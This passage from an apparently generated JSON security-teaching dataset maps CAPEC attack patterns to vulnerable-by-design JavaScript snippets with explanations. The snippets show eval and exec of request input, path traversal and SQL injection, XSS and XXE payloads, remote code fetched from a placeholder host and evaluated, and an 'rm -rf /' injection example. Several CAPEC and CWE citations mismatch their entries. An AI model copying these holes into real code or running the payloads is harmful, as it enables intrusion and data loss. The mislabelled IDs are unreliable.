        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Incorrect Behavior Order: Authorization Before Parsing and Canonicalization\napp.get('/secure/*', (req, res) => {\n  if (!req.user || !req.user.isAuthenticated) {\n    return res.status(403).send('Forbidden');\n  }\n  const filePath = req.params[0];\n  // Violation of Secure Design Principles\n  if (filePath.includes('..')) {\n    return res.status(400).send('Bad Request');\n  }\n  // Always-Incorrect Control Flow Implementation\n  if (filePath === 'admin') {\n    return res.status(200).send('Welcome Admin');\n  }\n  res.sendFile(`/secure/${filePath}`);\n});\n\n// Improper Protection of Alternate Path\napp.get('/secure/admin', (req, res) => {\n  if (!req.user || !req.user.isAdmin) {\n    return res.status(403).send('Forbidden');\n  }\n  res.send('Admin Panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web server using the Express framework. It embodies the deprecated CAPEC pattern by showing how improper handling of URL paths and authorization can lead to security vulnerabilities. The code includes several related CWEs:\n\n1. **CWE-551: Incorrect Behavior Order: Authorization Before Parsing and Canonicalization** - The server checks user authentication before fully parsing the file path, which can lead to authorization bypass if the path is not properly sanitized.\n\n2. **CWE-657: Violation of Secure Design Principles** - The code attempts to prevent directory traversal by checking for '..' in the file path, but this is a simplistic and insufficient approach.\n\n3. **CWE-670: Always-Incorrect Control Flow Implementation** - The control flow for handling the 'admin' path is incorrect and does not reflect a secure design, potentially allowing unauthorized access.\n\n4. **CWE-424: Improper Protection of Alternate Path** - The '/secure/admin' route is not sufficiently protected, allowing potential unauthorized access to the admin panel.\n\nOverall, the code snippet highlights the importance of proper URL parsing, secure design principles, and comprehensive authorization checks to prevent security vulnerabilities."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "const authenticateUser = (username, password) => {\n  // Client-side authentication (CWE-603)\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n};\n\nconst accessControl = (user) => {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (authenticateUser(user.username, user.password)) {\n    console.log('Access granted to sensitive data');\n  } else {\n    console.log('Access denied');\n  }\n};\n\n// Simulating a client-side request\nconst user = { username: 'admin', password: 'password123' };\naccessControl(user);\n\n// Potential attack: bypassing client-side authentication\nconst maliciousUser = { username: 'admin', password: 'wrongpassword' };\naccessControl(maliciousUser);",
        "description": "This JavaScript code snippet demonstrates a scenario where authentication and access control are enforced on the client side, which is a significant security vulnerability. The `authenticateUser` function checks the username and password, and the `accessControl` function grants or denies access based on this client-side check. This setup is vulnerable because an attacker can modify the client-side code to bypass authentication (CWE-603) and access control (CWE-602). The code highlights the risks of relying on client-side mechanisms for security, which should instead be enforced on the server side to prevent unauthorized access."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const filePath = req.url.substring(1); // Extract file path from URL\n  \n  // CWE-20: Improper Input Validation\n  // CWE-99: Improper Control of Resource Identifiers\n  // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n  // CWE-1289: Improper Validation of Unsafe Equivalence in Input\n  // CWE-913: Improper Control of Dynamically-Managed Code Resources\n  \n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads a file specified by the URL path and returns its contents. The code is vulnerable to resource injection attacks due to improper input validation (CWE-20). Specifically, it does not validate the file path extracted from the URL (CWE-99), allowing an attacker to specify arbitrary file paths, potentially accessing sensitive files outside the intended directory. Additionally, the code does not check if the file path is safe or within the expected bounds (CWE-1285, CWE-1289), and it improperly manages dynamically-accessed resources (CWE-913). This demonstrates the main idea of the CAPEC: exploiting weaknesses in input validation to manipulate resource identifiers."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  try {\n    // Vulnerable to code injection\n    eval(userInput);\n  } catch (e) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Server Error');\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Executed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL to extract a query parameter named 'input' and then uses the 'eval' function to execute this input. This is a classic example of code injection vulnerability (CAPEC-242), where user input is directly executed as code. The use of 'eval' with untrusted input can lead to arbitrary code execution, making the application highly insecure. The code also demonstrates the use of an obsolete function (CWE-477) as 'eval' is generally considered unsafe and outdated for executing dynamic code."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  try {\n    // Vulnerable code: directly evaluating user input\n    const result = eval(userInput);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Result: ${result}`);\n  } catch (e) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Error in input');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the query parameters from the URL and extracts a parameter named 'input'. The code then uses the 'eval' function to execute the user-provided input as JavaScript code. This is a classic example of a code injection vulnerability (CWE-94) because it allows an attacker to inject and execute arbitrary code on the server. The code does not properly neutralize special elements in the input (CWE-74), and it directly uses the input in a command (CWE-77), making it highly susceptible to malicious code execution (CWE-506). This snippet demonstrates the main idea of CAPEC-242 (Code Injection) by showing how improper input validation and handling can lead to severe security issues."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "<a href=\"#\" onclick=\"alert('XSS Attack!')\">Click me</a>",
        "description": "This JavaScript code snippet demonstrates a basic example of an XSS attack targeting HTML attributes. The 'onclick' attribute of the anchor tag contains a JavaScript alert function that will execute when the link is clicked. This represents the CAPEC's main idea of inserting malicious commands into HTML attributes. The related CWEs highlight the improper neutralization of script in attributes, which allows such attacks to occur. In a real-world scenario, an attacker could use this method to execute more harmful scripts, such as stealing cookies or performing other malicious activities."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "description": "This code snippet demonstrates a basic example of an XSS attack targeting URI placeholders. The anchor tag's href attribute contains a 'javascript:' URI scheme, which is a common vector for XSS attacks. When a user clicks on the link, the browser executes the JavaScript code, triggering an alert box. This example highlights the vulnerability described in CAPEC-139, where browsers interpret 'javascript:' URIs as executable content. The related CWEs emphasize the importance of properly neutralizing script content in attributes, especially in tags like 'a' and 'img', to prevent such attacks."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "const userInput = '<<script>alert(\"XSS\")<</script>';\nconst sanitizedInput = userInput.replace(/<</g, '<');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to 'XSS Using Doubled Characters' as described in the CAPEC. The user input contains doubled '<' characters to bypass a naive input validation mechanism. The code attempts to sanitize the input by replacing '<<' with '<', but this is insufficient because it does not fully neutralize the potential XSS attack. When the sanitized input is inserted into the DOM using 'innerHTML', the script tag is executed, leading to an XSS attack. This example highlights the importance of proper input validation and neutralization to prevent XSS vulnerabilities."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "<html>\n<head>\n    <title>Vulnerable Flash XSS Example</title>\n</head>\n<body>\n    <h1>Welcome to the Vulnerable Page</h1>\n    <embed src=\"vulnerable.swf?param=<script>alert('XSS');</script>\" type=\"application/x-shockwave-flash\" width=\"300\" height=\"200\"></embed>\n</body>\n</html>",
        "description": "This HTML code snippet demonstrates a deprecated XSS vulnerability using Flash. The 'embed' tag includes a Flash file ('vulnerable.swf') with a parameter that contains a script tag. This script tag is not properly neutralized, leading to a cross-site scripting (XSS) attack. The code also touches on related CWEs: CWE-692 (Incomplete Denylist to Cross-Site Scripting) as it does not properly filter the input, CWE-87 (Improper Neutralization of Alternate XSS Syntax) as it fails to neutralize the script syntax, and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) by analogy, as it shows improper neutralization in a different context."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "<script>\n  // Simulate user input containing invalid characters\n  var userInput = \"<script>alert('XSS');</script>\\0\";\n\n  // Function to sanitize input (improperly)\n  function sanitizeInput(input) {\n    // Only remove < and > characters, ignoring invalid characters like null\n    return input.replace(/<|>/g, \"\");\n  }\n\n  // Simulate processing the sanitized input\n  var sanitizedInput = sanitizeInput(userInput);\n\n  // Output the sanitized input to the web page\n  document.write(sanitizedInput);\n</script>",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can insert invalid characters (e.g., null character '\\0') to bypass input filtering and execute a cross-site scripting (XSS) attack. The `sanitizeInput` function attempts to remove only the '<' and '>' characters but fails to account for invalid characters like null. As a result, the malicious script `<script>alert('XSS');</script>` is not fully neutralized and can be executed when written to the web page. This example embodies the main idea of CAPEC-86 and related CWEs, highlighting improper neutralization of invalid characters and script-related HTML tags."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // User input can be manipulated to inject commands",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an OS command (`ls ${userInput}`) without proper validation or sanitization. This allows an attacker to inject arbitrary commands by manipulating the `userInput` parameter. For example, if an attacker provides `; rm -rf /`, it would execute the `ls` command followed by the `rm -rf /` command, potentially causing significant damage. This snippet embodies the main idea of CAPEC-88 and related CWEs, highlighting the risks of improper neutralization of special elements and argument delimiters in command construction."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "const http = require('http');\nconst { exec } = require('child_process');\n\nhttp.createServer((req, res) => {\n  const userInput = req.url.split('?cmd=')[1];\n  if (userInput) {\n    exec(userInput, (error, stdout, stderr) => {\n      if (error) {\n        res.writeHead(500, { 'Content-Type': 'text/plain' });\n        res.end(`Error: ${error.message}`);\n        return;\n      }\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end(stdout || stderr);\n    });\n  } else {\n    res.writeHead(400, { 'Content-Type': 'text/plain' });\n    res.end('No command provided');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a command from the URL query parameter 'cmd' and executes it using the 'exec' function from the 'child_process' module. The output of the command is then sent back to the client. This code is vulnerable to OS Command Injection (CWE-78) because it directly uses user input to construct and execute an OS command without proper sanitization or validation. This embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' and highlights the risks associated with improper neutralization of special elements in commands."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/xml', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    const userInput = result.userInput;\n    // Vulnerable XPath query\n    const xpathQuery = `//user[username/text()='${userInput.username}' and password/text()='${userInput.password}']`;\n    // Simulate XML database query\n    const fakeXmlDatabase = `<users><user><username>admin</username><password>admin</password></user></users>`;\n    xml2js.parseString(fakeXmlDatabase, (err, dbResult) => {\n      if (err) {\n        res.status(500).send('Server Error');\n        return;\n      }\n      const users = dbResult.users.user;\n      const user = users.find(u => u.username[0] === userInput.username && u.password[0] === userInput.password);\n      if (user) {\n        res.send('Login successful');\n      } else {\n        res.status(401).send('Unauthorized');\n      }\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable XML Injection scenario using an Express.js server. The server accepts XML input via a POST request and parses it using the xml2js library. The user input is then used to construct an XPath query without proper input validation or neutralization, making it susceptible to XML Injection attacks. An attacker could manipulate the XML input to alter the structure of the XPath query, potentially gaining unauthorized access to data. This example embodies the main idea of CAPEC-91 and related CWEs, highlighting the risks of improper input validation and neutralization in XML processing."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to include a local file based on user input\nfunction includeLocalFile(fileName) {\n  const filePath = path.join(__dirname, fileName);\n  if (fs.existsSync(filePath)) {\n    const fileContent = fs.readFileSync(filePath, 'utf8');\n    eval(fileContent); // Dangerous: executing the content of the file\n  } else {\n    console.log('File does not exist.');\n  }\n}\n\n// Example usage\nconst userInput = 'userProvidedFile.js'; // This could be controlled by an attacker\nincludeLocalFile(userInput);",
        "description": "This JavaScript code snippet demonstrates a Local Code Inclusion vulnerability. The function `includeLocalFile` takes a file name as input, constructs the file path, checks if the file exists, reads its content, and then executes it using `eval()`. This is dangerous because it allows an attacker to control the file name and potentially execute arbitrary code. This snippet embodies the main idea of CAPEC-829 (Local Code Inclusion) and touches on related CWEs such as CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-913 (Improper Control of Dynamically-Managed Code Resources). The use of `eval()` to execute file content is particularly risky and represents CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No file specified');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads a file specified by a query parameter in the URL and returns its contents. The main idea of the CAPEC (PHP Local File Inclusion) is represented here by allowing an attacker to specify an arbitrary file path via the 'file' query parameter. This can lead to the inclusion and execution of unintended files, similar to how PHP Local File Inclusion vulnerabilities work. The related CWEs are reflected in the code's reliance on external input for file paths (CWE-98), lack of validation on the file path (CWE-829), and potential for misclassification of files (CWE-646)."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "const http = require('http');\nconst url = 'http://example.com/malicious.js';\n\nhttp.get(url, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    eval(data); // Dangerous: executing code from an untrusted source\n  });\n}).on('error', (err) => {\n  console.error('Error fetching the script:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a Remote Code Inclusion vulnerability. It fetches a JavaScript file from a remote URL and executes it using `eval()`. This is dangerous because the code being executed is from an untrusted source, which could be malicious. This snippet embodies the main idea of CAPEC-197 (Remote Code Inclusion) and is related to several CWEs: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-494 (Download of Code Without Integrity Check), and CWE-506 (Embedded Malicious Code). The code does not verify the integrity or origin of the downloaded script, making it susceptible to attacks."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xml, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed result:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to DTD Injection (CAPEC-228) and improper control of Document Type Definition (CWE-827). The code uses the 'xml2js' library to parse an XML string that includes an external entity reference. The XML string defines a DTD with an entity 'xxe' that references the local file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive information from the file system. This example highlights the risk of allowing arbitrary DTDs and the importance of properly controlling and restricting DTD usage in XML processing to prevent such vulnerabilities."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n\n      try {\n        const arraySize = parseInt(result.array.$.size, 10);\n        const arrayData = result.array.item;\n\n        // Vulnerable code: trusting the size attribute without validation\n        let buffer = new Array(arraySize);\n        for (let i = 0; i < arrayData.length; i++) {\n          buffer[i] = arrayData[i];\n        }\n\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end('Array processed successfully');\n      } catch (e) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Server error');\n      }\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that processes SOAP requests containing an array. The server uses the 'xml2js' library to parse the incoming XML data. The vulnerability lies in the fact that the server naively trusts the 'size' attribute of the array without validating it against the actual length of the array data. This can lead to a buffer overflow if the 'size' attribute is understated, causing the server to allocate a smaller buffer and then attempt to read more data into it than it can hold. This example embodies the main idea of the CAPEC 'SOAP Array Overflow' and is related to CWEs such as 'Buffer Access with Incorrect Length Value' and 'Improper Handling of Length Parameter Inconsistency'."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "const fs = require('fs');\n\n// Simulate a transaction data structure\nlet transaction = {\n  id: 12345,\n  amount: 1000,\n  status: 'pending'\n};\n\n// Log transaction data to a file (CWE-532)\nfs.appendFile('server.log', JSON.stringify(transaction), (err) => {\n  if (err) throw err;\n  console.log('Transaction data logged.');\n});\n\n// Simulate an attacker modifying the transaction data (CWE-766, CWE-767)\ntransaction.amount = 5000;\ntransaction.status = 'completed';\n\n// Log the modified transaction data to a file (CWE-532)\nfs.appendFile('server.log', JSON.stringify(transaction), (err) => {\n  if (err) throw err;\n  console.log('Modified transaction data logged.');\n});",
        "description": "This JavaScript code snippet demonstrates a deprecated attack pattern related to the abuse of a transaction data structure. The code simulates a transaction object and logs its data to a server log file, which is a potential information exposure vulnerability (CWE-532). It then simulates an attacker modifying the transaction data, representing a failure to protect stored data from modification (CWE-766, CWE-767). The modified transaction data is also logged, further exposing sensitive information. This example highlights the importance of securing transaction data and preventing unauthorized modifications and information exposure."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    client.write('AUTH user:password'); // CWE-603: Client-side authentication\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    if (data.toString().includes('AUTH_SUCCESS')) {\n        // CWE-294: Capture-replay vulnerability\n        client.write('GET /sensitive-data');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and performs client-side authentication by sending credentials directly from the client (CWE-603). If the server responds with an 'AUTH_SUCCESS' message, the client then requests sensitive data. This setup is vulnerable to capture-replay attacks (CWE-294), where an attacker could sniff the network traffic, capture the authentication message, and replay it to gain unauthorized access to sensitive data. The code highlights the risks associated with performing authentication on the client side and the potential for replay attacks."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  console.log('Connected');\n  client.write('AUTH user:password'); // Client-side authentication\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  if (data.toString().includes('AUTH_SUCCESS')) {\n    // Simulate capture-replay attack\n    setTimeout(() => {\n      client.write('REPLAYED_AUTH user:password');\n    }, 5000);\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-server interaction where authentication is performed on the client side. The client connects to a server and sends authentication credentials ('AUTH user:password'). Upon receiving an 'AUTH_SUCCESS' message, it simulates a capture-replay attack by resending the same credentials after a delay. This embodies the main idea of CAPEC-65, where an attacker can sniff and capture application code or credentials during transmission and replay them to bypass authentication. The code also highlights CWE-294 (Authentication Bypass by Capture-replay) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  console.log('Connected');\n  client.write('AUTH user:password'); // Client-side authentication\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  if (data.toString().includes('AUTH_SUCCESS')) {\n    // Simulate capture-replay attack\n    setTimeout(() => {\n      client.write('AUTH user:password'); // Replay the authentication message\n    }, 5000);\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simple TCP client that connects to a server and performs client-side authentication by sending an 'AUTH user:password' message. The server's response is checked for an 'AUTH_SUCCESS' message. If authentication is successful, the code simulates a capture-replay attack by resending the same authentication message after a delay. This embodies the main idea of CAPEC-65, where an attacker can sniff and capture authentication messages and replay them to bypass authentication. The code also highlights CWE-294 (Authentication Bypass by Capture-replay) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst mysql = require('mysql');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.post('/search', (req, res) => {\n  const searchTerm = req.body.searchTerm;\n  const query = `SELECT * FROM users WHERE name LIKE '%${searchTerm}%'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.status(500).send(`Error: ${error.message}`);\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes a POST endpoint '/search' that takes a 'searchTerm' from the request body and constructs an SQL query to search for users by name. The query is vulnerable to SQL Injection (CWE-89) because it directly incorporates user input without proper sanitization. Additionally, if an error occurs during the query execution, the error message is sent back to the client, potentially exposing sensitive information (CWE-209). This setup exemplifies the CAPEC scenario where an adversary can send modified queries to extract sensitive information or cause the application to reveal more information through error messages."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(filePath) {\n  if (!fs.existsSync(filePath)) {\n    throw new Error('File does not exist');\n  }\n\n  const fileExtension = path.extname(filePath);\n  if (fileExtension !== '.txt') {\n    throw new Error('Unsupported file type');\n  }\n\n  const fileContent = fs.readFileSync(filePath, 'utf8');\n  // Simulate processing the file content\n  console.log('Processing file content:', fileContent);\n}\n\n// Example usage\ntry {\n  processFile('/tmp/unsafe_file.txt');\n} catch (error) {\n  console.error('Error processing file:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable file processing function that embodies the main idea of the CAPEC 'Force Use of Corrupted Files'. The function 'processFile' takes a file path as input and performs basic checks, such as verifying the file's existence and its extension. However, it relies on the file extension to determine the file type (CWE-646) and does not perform thorough validation of the file's content. This can lead to scenarios where an attacker can upload a corrupted or malicious file with a '.txt' extension, causing the application to process it unsafely. Additionally, the code does not handle temporary files securely (CWE-377) and does not verify the source of the file (CWE-829), making it susceptible to attacks that force the application to use corrupted files, potentially leading to denial of service or other malicious outcomes."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "const exec = require('child_process').exec;\n\n// CWE-1108: Excessive Reliance on Global Variables\nlet command = process.env.USER_COMMAND;\n\n// CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to environment variable manipulation, specifically CAPEC-13: Subverting Environment Variable Values. The code uses the 'exec' function from the 'child_process' module to execute a command stored in an environment variable 'USER_COMMAND'. This is a security risk because the environment variable can be manipulated to inject malicious commands, leading to potential command injection attacks (CWE-95). Additionally, the use of a global variable 'command' (CWE-1108) increases the risk of unintended side effects and makes the code harder to maintain and secure."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "var globalVar = 'sensitiveData';\n\nfunction manipulateGlobalVar(userInput) {\n    eval('globalVar = ' + userInput);\n}\n\nmanipulateGlobalVar('\"newData\"');\nconsole.log(globalVar);",
        "description": "This JavaScript code snippet demonstrates the vulnerability of global variable manipulation. The global variable 'globalVar' is declared and initialized with 'sensitiveData'. The function 'manipulateGlobalVar' takes user input and uses the 'eval' function to dynamically assign a new value to 'globalVar'. This represents CWE-1108 (Excessive Reliance on Global Variables) and CWE-627 (Dynamic Variable Evaluation). The use of 'eval' with user input can lead to arbitrary code execution, showcasing CWE-914 (Improper Control of Dynamically-Identified Variables) and CWE-913 (Improper Control of Dynamically-Managed Code Resources). The global variable's unnecessarily wide scope is an example of CWE-1126 (Declaration of Variable with Unnecessarily Wide Scope). This code is vulnerable to attacks where an attacker can manipulate the global variable by providing malicious input to the 'manipulateGlobalVar' function."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "const userInput = \"../../etc/passwd\";\n\nfunction validateInput(input) {\n  const validPattern = /^[a-zA-Z0-9_\\-\\/]+$/;\n  return validPattern.test(input);\n}\n\nfunction canonicalizeInput(input) {\n  const parts = input.split('/');\n  const canonicalParts = [];\n  for (const part of parts) {\n    if (part === '..') {\n      canonicalParts.pop();\n    } else if (part !== '.') {\n      canonicalParts.push(part);\n    }\n  }\n  return canonicalParts.join('/');\n}\n\nif (validateInput(userInput)) {\n  const safePath = canonicalizeInput(userInput);\n  console.log(`Safe path: ${safePath}`);\n} else {\n  console.log('Invalid input');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can lead to security issues. The `validateInput` function checks if the input matches a specific pattern, but this validation occurs before the input is canonicalized by the `canonicalizeInput` function. As a result, an attacker can bypass the validation by using sequences like `../` to navigate to unintended directories. This embodies the main idea of the deprecated CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'. The code also touches on CWE-95 'Eval Injection' by showing how improper handling of input can lead to security vulnerabilities, although it does not directly use `eval`."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  let userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input\n  userInput = decodeURIComponent(userInput);\n  // Use the input in a file path\n  const filePath = `/uploads/${userInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express.js server that handles POST requests to the '/submit' endpoint. The server receives user input, validates it using a regular expression to ensure it only contains alphanumeric characters, and then decodes the input using `decodeURIComponent`. This sequence represents the CAPEC's main idea of leveraging alternate encoding, as the validation occurs before canonicalization, which can lead to improper handling of alternate encodings (CWE-180). The code also demonstrates potential vulnerabilities related to improper input validation (CWE-20) and external control of file paths (CWE-73)."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
